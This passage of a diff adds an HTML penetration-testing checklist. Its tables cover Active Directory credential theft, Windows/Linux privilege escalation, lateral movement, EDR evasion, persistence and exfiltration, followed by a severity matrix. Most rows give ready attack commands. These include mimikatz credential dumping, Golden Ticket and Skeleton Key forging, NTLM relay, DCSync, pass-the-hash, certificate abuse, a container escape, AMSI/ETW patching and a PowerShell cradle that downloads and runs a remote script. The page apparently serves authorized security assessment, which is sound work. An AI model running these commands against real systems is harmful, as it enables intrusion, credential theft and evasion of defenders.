+<td><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code> | <code>lsass</code> dump via comsvcs/<code>rundll32</code>, <code>pypykatz</code> offline</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.3</td>
+<td>NTLM Relay</td>
+<td>Critical</td>
+<td><code>Responder -I eth0 -dwv</code> + <code>ntlmrelayx.py -tf targets.txt -smb2support</code> (capture &amp; relay)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.4</td>
+<td>AS-REP / Kerberoast crack</td>
+<td>Critical</td>
+<td><code>hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.5</td>
+<td>DCSync</td>
+<td>Critical</td>
+<td><code>secretsdump.py domain/user:pass@dc_ip</code> (needs DA/backup rights)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.6</td>
+<td>Unconstrained/Constrained Delegation abuse</td>
+<td>Critical</td>
+<td><code>kekeo</code> / <code>Rubeus /ptt</code> — impersonate admin on trusted services</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.7</td>
+<td>Resource-Based Constrained Delegation (RBCD)</td>
+<td>Critical</td>
+<td><code>Get-NtComputerHash</code> + <code>rbcd.py</code> + S4U2self → DA impersonation</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.8</td>
+<td>ADCS / Certificate Services abuse</td>
+<td>Critical</td>
+<td><code>certipy find -u u@domain -p pass -dc-ip &lt;ip&gt; -vulnerable</code> → ESC1-ESC8 templates → <code>certipy req</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.9</td>
+<td>GMSA password extraction</td>
+<td>Critical</td>
+<td><code>gMSADumper.py -u u -p p -d domain</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.3.10</td>
+<td>dpapi/Chrome creds</td>
+<td>High</td>
+<td><code>mimikatz dpapi::chrome</code> — browser-stored creds</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="3.4-%E2%80%94-privilege-escalation-(windows%2Flinux)" tabindex="-1">3.4 — Privilege Escalation (Windows/Linux)</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.4.1</td>
+<td>Windows PE enumeration</td>
+<td>Critical</td>
+<td><code>winPEAS.exe</code> | <code>Seatbelt.exe -group=all</code> | `powershell -ep bypass -c &quot;iwr http://x/PowerUp.ps1</td>
+<td>iex; Invoke-AllChecks&quot;`</td>
+</tr>
+<tr>
+<td>3.4.2</td>
+<td>Unquoted service paths</td>
+<td>High</td>
+<td><code>wmic service get name,pathname | findstr /i &quot;Program Files&quot;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.3</td>
+<td>Service config abuse</td>
+<td>High</td>
+<td><code>accesschk.exe -uwcqv user *</code> | <code>sc qc &lt;service&gt;</code> (SERVICE_CHANGE_CONFIG → binPath hijack)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.4</td>
+<td>AlwaysInstallElevated</td>
+<td>High</td>
+<td><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code> — both =1 → <code>.msi</code> as SYSTEM</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.5</td>
+<td>UAC bypass</td>
+<td>Medium</td>
+<td><code>UACME</code> techniques (fodhelper, computerdefaults)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.6</td>
+<td>SeImpersonate → Potato family</td>
+<td>Critical</td>
+<td><code>whoami /priv</code> → SeImpersonate → <code>GodPotato</code>/<code>JuicyPotatoNG</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.7</td>
+<td>Kernel exploits</td>
+<td>Critical</td>
+<td><code>systeminfo</code> → compare Watson/winPEAS → printnightmare, CVE-2021-1675</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.8</td>
+<td>Scheduled tasks / autoruns</td>
+<td>High</td>
+<td><code>schtasks /query /fo LIST /v</code> | <code>Get-ScheduledTask</code> misconfigured ones</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.9</td>
+<td>Linux PE enumeration</td>
+<td>Critical</td>
+<td><code>linPEAS.sh</code> | <code>pspy</code> (cronjobs) | <code>sudo -l</code> (GTFOBins)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.10</td>
+<td>SUID/GTFOBins</td>
+<td>High</td>
+<td><code>find / -perm -4000 2&gt;/dev/null</code> → gtfobins.github.io</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.4.11</td>
+<td>Docker/LXD group escape</td>
+<td>Critical</td>
+<td><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code> (if in docker group)</td>
+<td>☐\</td>
+</tr>
+</tbody>
+</table>
+<h2 id="3.5-%E2%80%94-lateral-movement" tabindex="-1">3.5 — Lateral Movement</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Commands / Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.5.1</td>
+<td>Pass-the-Hash</td>
+<td>Critical</td>
+<td><code>nxc smb &lt;ip&gt; -u admin -H &lt;NTLM&gt;</code> | <code>psexec.py -hashes :NTLM domain/admin@ip</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.5.2</td>
+<td>Overpass-the-hash / PtT</td>
+<td>Critical</td>
+<td><code>Rubeus /ptt /ticket:&lt;kirbi&gt;</code> → access C$ shares</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.5.3</td>
+<td>WMI/SMB exec lateral</td>
+<td>Critical</td>
+<td><code>wmiexec.py domain/user:pass@ip</code> | <code>atexec.py</code> | <code>smbexec.py</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.5.4</td>
+<td>RDP session hijack</td>
+<td>High</td>
+<td><code>tscon &lt;id&gt; /dest:console</code> (as SYSTEM)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.5.5</td>
+<td>DCOM lateral</td>
+<td>High</td>
+<td><code>dcomexec.py</code> (MMC20, ShellWindows)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.5.6</td>
+<td>Golden Ticket</td>
+<td>Critical</td>
+<td><code>mimikatz &quot;kerberos::golden /user:fake /domain:x /sid:&lt;sid&gt; /krbtgt:&lt;hash&gt; /id:500&quot;</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.5.7</td>
+<td>Silver Ticket</td>
+<td>Critical</td>
+<td>Forge TGS for service (<code>krbtgt</code>→service account hash)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.5.8</td>
+<td>Shadow Credentials / Key trust</td>
+<td>High</td>
+<td><code>certipy shadow auto -u u@domain -p p</code> → NT hash of target</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="3.6-%E2%80%94-defense-evasion-(edr-bypass-%E2%80%94-xct.de)" tabindex="-1">3.6 — Defense Evasion (EDR Bypass — xct.de)</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.6.1</td>
+<td>AMSI Bypass</td>
+<td>High</td>
+<td><code>amsi.fail</code> variants — e.g., patching <code>AmsiScanBuffer</code>, <code>amsiInitFailed</code> (obfuscate, don't run plain)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.2</td>
+<td>ETW Patching</td>
+<td>High</td>
+<td>Patch<code>EtwEventWrite</code> — <code>[Ref].Assembly.GetType('Sys...').GetField(...).SetValue($null,[IntPtr]::MaxValue)</code> variants</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.3</td>
+<td>Direct Syscalls (avoid ntdll hooks)</td>
+<td>High</td>
+<td>SysWhispers3 (<code>Jump</code>/<code>Trampoline</code> variants), HellsGate/HalosGate/Tartarus</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.4</td>
+<td>Unhooking ntdll</td>
+<td>High</td>
+<td>Map fresh<code>ntdll</code> from disk → remap .text section (classic unhooking)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.5</td>
+<td>Shellcode encryption/staging</td>
+<td>High</td>
+<td>AES/RC4 encrypted shellcode, sleep obfuscation (Ekko/Zilean), stack spoofing (Syscall stack)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.6</td>
+<td>In-memory injection variants</td>
+<td>High</td>
+<td>APC injection, callback injection, module stomping, phantom DLL hollowing, fiber injection</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.7</td>
+<td>LOLBins for execution</td>
+<td>Medium</td>
+<td><code>rundll32, mshta, regsvr32 /i:http, installutil, msiexec</code> — pair w/ <code>SharpCradle</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.8</td>
+<td>PowerShell without PowerShell</td>
+<td>High</td>
+<td><code>powershellCLM bypass</code> via COM, PS By-pass with <code>Runspaces</code> in C#, <code>Silence</code></td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.9</td>
+<td>Defender AV exclusion testing</td>
+<td>High</td>
+<td>Check exclusions:<code>Get-MpPreference | select -Expand Exclusion*</code> (post-comp)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.10</td>
+<td>EDR detection testing (safe)</td>
+<td>High</td>
+<td>Atomic Red Team,<code>VECTR</code> — validate what gets flagged vs. allowed</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.11</td>
+<td>C2 traffic blending</td>
+<td>High</td>
+<td>Malleable C2 profiles, domain fronting, CDN (Cloudflare) C2, SMB/TCP beacons over named pipes, jitter</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.6.12</td>
+<td>Living-off AD (CSIDH/petitpotam)</td>
+<td>Critical</td>
+<td><code>PetitPotam</code> → NTLM relay to AD CS (ESC8) → Domain Admin</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h2 id="3.7-%E2%80%94-persistence-%26-exfiltration" tabindex="-1">3.7 — Persistence &amp; Exfiltration</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Severity</th>
+<th>Methodology</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.7.1</td>
+<td>Golden/Silver tickets (persistence)</td>
+<td>Critical</td>
+<td>See 3.5.6/7</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.7.2</td>
+<td>Skeleton Key</td>
+<td>Critical</td>
+<td><code>mimikatz &quot;misc::skeleton&quot;</code> (DC-level, careful!)</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.7.3</td>
+<td>DSRM/AdminSDHolder/ACL abuse</td>
+<td>High</td>
+<td><code>Set-DomainObject -Set @{'msds-...'}</code> — backdoor ACLs</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.7.4</td>
+<td>Web shells / scheduled tasks</td>
+<td>High</td>
+<td>Keep foothold via hidden task, registry run keys</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.7.5</td>
+<td>Data staging + exfil simulation</td>
+<td>Critical</td>
+<td>Compress → split → exfil over allowed channel (HTTPS/Teams) — measure DLP</td>
+<td>☐</td>
+</tr>
+<tr>
+<td>3.7.6</td>
+<td>C2 beacon validation</td>
+<td>High</td>
+<td>Verify callbacks, dwell-time detection by SOC</td>
+<td>☐</td>
+</tr>
+</tbody>
+</table>
+<h1 id="part-4%3A-severity-classification-matrix-(apply-to-all-findings)" tabindex="-1">PART 4: SEVERITY CLASSIFICATION MATRIX (apply to all findings)</h1>
+<table>
+<thead>
+<tr>
+<th>Severity</th>
+<th>Criteria</th>
+<th>CVSS Range</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Critical</strong></td>
+<td>RCE, SQLi (data access), Auth bypass, SSRF→internal, DA compromise, full account takeover</td>
+<td>9.0–10.0</td>
+<td>Log4Shell, SQLi with creds, Kerberoast→DA</td>
+</tr>
+<tr>
+<td><strong>High</strong></td>
+<td>Stored XSS, IDOR (sensitive), XXE local, RCE with prerequisites, credential leak</td>
+<td>7.0–8.9</td>
+<td>Admin IDOR, LFI→source</td>
+</tr>
+<tr>
+<td><strong>Medium</strong></td>
+<td>Reflected XSS, CSRF (moderate), verbose errors, weak rate-limit</td>
+<td>4.0–6.9</td>
+<td>CSRF email change, open redirect chain</td>
+</tr>
+<tr>
+<td><strong>Low</strong></td>
+<td>Missing headers, clickjacking, self-XSS, info disclosure</td>
+<td>0.1–3.9</td>
+<td>No X-Frame-Options</td>
+</tr>
+<tr>
+<td><strong>Info</strong></td>
+<td>Hardening recommendations, best-practice gaps</td>
+<td>—</td>
+<td>Server banner, TLS1.0 note</td>
+</tr>
+</tbody>
+</table>
+
+    </div>
+</body>
+</html>
